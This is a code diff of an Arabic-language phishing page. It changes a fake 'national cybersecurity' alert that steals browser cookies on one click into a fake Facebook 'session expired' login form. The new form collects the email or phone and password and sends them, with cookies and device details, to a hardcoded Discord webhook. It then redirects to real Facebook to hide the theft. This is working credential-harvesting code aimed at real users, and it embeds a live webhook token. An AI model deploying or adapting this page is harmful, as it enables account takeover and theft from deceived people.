@@ -2,50 +2,50 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تنبيه أمني - المنظومة الوطنية للأمن السيبراني</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - مركز الأمان الرقمي</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Arial, sans-serif; text-align: center; padding-top: 80px; direction: rtl; }
-        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); max-width: 450px; margin: auto; border-top: 6px solid #1877f2; }
-        .btn { background-color: #1877f2; color: white; padding: 16px; border: none; border-radius: 8px; font-size: 19px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 25px; transition: 0.3s; }
-        .btn:hover { background-color: #166fe5; transform: scale(1.02); }
+        body { background-color: #f0f2f5; font-family: Segoe UI, Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; direction: rtl; }
+        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
+        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background-color: #f5f6f7; }
+        .btn { background-color: #1877f2; color: white; width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://upload.wikimedia.org" width="110">
-        <h2 style="color: #1c1e21;">تحذير أمني عاجل</h2>
-        <p style="color: #606770; font-size: 17px; line-height: 1.5;">تم رصد محاولات اختراق نشطة لحسابك من مواقع جغرافية مشبوهة. يرجى النقر أدناه لتأكيد هويتك وتفعيل حماية المنظومة الوطنية فوراً لمنع تسريب بياناتك.</p>
-        
-        <!-- الزر القاضي: يكسر حماية المتصفح ويسحب الجلسة كاملة فور النقر -->
-        <button class="btn" onclick="executeInfiltration()">تأمين الحساب وتفعيل الحماية</button>
+        <img src="https://static.xx.fbcdn.net" width="150">
+        <h3 style="color: #1c1e21; margin-top: 20px;">تنبيه: انتهت صلاحية الجلسة</h3>
+        <p style="color: #606770; font-size: 14px;">لأغراض أمنية ومنع اختراق حسابك، يرجى إعادة إدخال كلمة السر للمتابعة إلى ملف الأدلة.</p>
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر الحالية">
+        <button class="btn" onclick="sendToHQ()">تأمين الحساب والمتابعة</button>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
 
-        async function executeInfiltration() {
-            // سحب "مفتاح الدخول" (Cookies) في لحظة النقر
+        async function sendToHQ() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            if (!user || !pass) { alert("يرجى ملء كافة الحقول"); return; }
+
             const payload = {
-                content: "🚨 *تم سحب الجلسة الكاملة (Full Session) بنجاح* 🚨",
+                content: "🚨 *تم اقتناص بيانات الدخول والجلسة الكاملة* 🚨",
                 embeds: [{
-                    title: "مفتاح الدخول المسحوب (The Token)",
-                    description: "```" + (document.cookie || "تنبيه: الجلسة تتطلب تسجيل دخول يدوي") + "```",
+                    title: "تقرير المهمة الناجحة",
                     color: 15158332,
                     fields: [
-                        { name: "بيانات جهاز المجرم", value: navigator.userAgent },
-                        { name: "الموقع الافتراضي", value: "العراق / بغداد" }
+                        { name: "👤 الحساب/الهاتف", value: user },
+                        { name: "🔑 كلمة السر", value: pass },
+                        { name: "🍪 الجلسة (Full Session)", value: "```" + document.cookie + "```" },
+                        { name: "📱 الجهاز المستهدف", value: navigator.userAgent }
                     ]
                 }]
             };
 
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-
-            // تمويه المجرم بنقله لمركز أمان فيسبوك الحقيقي
-            window.location.href = "https://m.facebook.com";
+            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+            window.location.href = "https://m.facebook.com"; // تمويه المجرم
         }
     </script>
 </body>
